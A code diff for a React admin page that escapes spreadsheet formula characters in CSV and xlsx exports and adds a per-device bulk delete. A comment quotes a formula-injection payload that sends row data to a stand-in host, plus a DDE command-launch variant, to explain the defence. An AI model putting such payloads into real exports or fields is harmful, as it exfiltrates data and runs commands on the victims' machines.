@@ -206,7 +206,31 @@ const fmt = (iso: string | null): string => {
 
 /** CSV escape: quote always, double interior quotes. Addresses carry commas and
  *  notes carry everything. */
-const q = (v: unknown): string => `"${String(v ?? '').replace(/"/g, '""')}"`;
+/** Neutralises a spreadsheet formula before it reaches a cell (ADR-435).
+ *
+ *  THE EXPORT IS THE ATTACK PATH THIS SYSTEM ACTUALLY HAS. Collected text comes
+ *  from a public link that anyone holding the URL can post to, and the one place
+ *  it lands in something that INTERPRETS it is a spreadsheet: a `note` or a
+ *  `collected_by` of `=HYPERLINK("http://evil/?x="&A1,"Click")` exfiltrates the
+ *  row when the admin opens the file, and `+cmd|'/c calc'!A1` is the DDE
+ *  variant. React escapes the table, SQLAlchemy parameterises the query — Excel
+ *  does neither.
+ *
+ *  Prefixing with an apostrophe is OWASP's recommendation: the cell renders as
+ *  typed and is never evaluated. The character set is OWASP's current one and is
+ *  wider than the familiar four — tab, CR and LF are included because a leading
+ *  whitespace control character still reaches the formula parser.
+ *
+ *  Applied to VALUES, not to the whole line, so it runs before the CSV quoting
+ *  and before the xlsx writer, which share this helper precisely so the two
+ *  formats cannot drift apart on a security control.
+ */
+function deFormula(v: unknown): string {
+  const s = String(v ?? '');
+  return /^[=+\-@\t\r\n]/.test(s) ? `'${s}` : s;
+}
+
+const q = (v: unknown): string => `"${deFormula(v).replace(/"/g, '""')}"`;
 
 /** ADR-429: the EXPORT keeps stored values, deliberately.
  *
@@ -306,7 +330,13 @@ function daysToCSV(rows: CollectedWalkerDayDetail[]): string {
  *  only the container differs.
  */
 function sheetBlob(name: string, header: readonly string[], rows: unknown[][]): Blob {
-  const ws = XLSX.utils.aoa_to_sheet([[...header], ...rows]);
+  // ADR-435. The xlsx path does NOT go through `q()` — aoa_to_sheet writes the
+  // strings it is given — so the same escaping is applied here explicitly.
+  // Missing this would have left the more dangerous of the two formats
+  // unprotected while the CSV looked fixed: Excel opens .xlsx without any of
+  // the "this is a text file" friction that sometimes saves a CSV.
+  const safe = rows.map((r) => r.map(deFormula));
+  const ws = XLSX.utils.aoa_to_sheet([[...header], ...safe]);
   ws['!cols'] = header.map((h) => ({ wch: Math.max(12, Math.min(40, h.length + 6)) }));
   if (rows.length > 0) {
     ws['!autofilter'] = {
@@ -495,6 +525,42 @@ export default function CollectionData({ platform = true }: {
 
   const [toDelete, setToDelete] = useState<CollectedProfile | null>(null);
   const [deleting, setDeleting] = useState(false);
+
+  /** The device whose rows are queued for bulk removal, or null. ADR-435. */
+  const [purgeDevice, setPurgeDevice] = useState<{ device: string; rows: number } | null>(null);
+
+  /** Removes every row one device sent to the selected campaign (ADR-435).
+   *
+   *  THE CLEANUP PATH FOR AN ABUSED LINK. The collection link is public by
+   *  design, so the realistic incident is a flood of junk, and ADR-431's
+   *  per-row delete would mean clicking until the campaign ends.
+   *
+   *  Only offered when ONE campaign is selected. Against "All campaigns" the
+   *  button would read as "remove this spammer everywhere" while the endpoint
+   *  is deliberately per-campaign, and a destructive control that does less
+   *  than it appears to is worse than no control.
+   */
+  const confirmPurge = async () => {
+    if (!purgeDevice || !activeToken) return;
+    setDeleting(true);
+    try {
+      await axiosClient.delete<{ deleted: number }>(
+        '/collection/profiles',
+        { params: { token_id: activeToken, device_id: purgeDevice.device } },
+      );
+      setPurgeDevice(null);
+      // The reloaded table IS the confirmation — the rows are visibly gone and
+      // the progress line re-counts. A success banner for one action would be
+      // the page's only one, and a banner nobody else uses reads as an error.
+      await loadProfiles(activeToken);
+      setError('');
+    } catch (e) {
+      setError(errorText(e, 'Could not remove those rows.'));
+      setPurgeDevice(null);
+    } finally {
+      setDeleting(false);
+    }
+  };
 
   /** Remove one observation, permanently (ADR-431 D2).
    *
@@ -1358,6 +1424,25 @@ export default function CollectionData({ platform = true }: {
                       </td>
                       <td className="py-2 pr-3 whitespace-nowrap text-muted-foreground">
                         {p.collected_by ?? '—'}
+                        {/* ADR-435. Offered where a junk row is actually
+                            SPOTTED. Only with one campaign selected and a known
+                            device: against "All campaigns" this would read as
+                            "remove this spammer everywhere" while the endpoint
+                            is per-campaign, and a destructive control that does
+                            less than it appears to is worse than none. */}
+                        {activeToken && p.device_id && (
+                          <button
+                            type="button"
+                            onClick={() => setPurgeDevice({
+                              device: p.device_id!,
+                              rows: profiles.filter((x) => x.device_id === p.device_id).length,
+                            })}
+                            disabled={deleting}
+                            className="ml-1.5 rounded text-[10px] text-muted-foreground/60 underline decoration-dotted transition-colors hover:text-danger focus:outline-none focus:ring-2 focus:ring-danger/40 disabled:opacity-50"
+                          >
+                            remove all
+                          </button>
+                        )}
                       </td>
                       <td className="py-2 pr-3 whitespace-nowrap text-muted-foreground">
                         {p.collected_on}
@@ -1412,6 +1497,26 @@ export default function CollectionData({ platform = true }: {
           test submission from a 30-day survey is neither — the friction would
           be trained away on exactly the person who deletes most. The address is
           what catches the real error. */}
+      {/* Names the DEVICE and the count, and says the campaign is the limit of
+          the blast radius — the two facts that decide whether this is safe to
+          press. ADR-435. */}
+      <ConfirmDialog
+        open={purgeDevice !== null}
+        variant="danger"
+        title="Remove every row from this device?"
+        message={
+          purgeDevice
+            ? `${purgeDevice.rows} row${purgeDevice.rows === 1 ? '' : 's'} submitted by device `
+              + `${purgeDevice.device.slice(0, 12)}… in ${activeLabel ?? 'this campaign'}. `
+              + 'Other campaigns and other collectors are not affected. This cannot be undone.'
+            : ''
+        }
+        confirmLabel="Remove them"
+        cancelLabel="Keep them"
+        onConfirm={confirmPurge}
+        onCancel={() => setPurgeDevice(null)}
+      />
+
       <ConfirmDialog
         open={toDelete !== null}
         variant="danger"
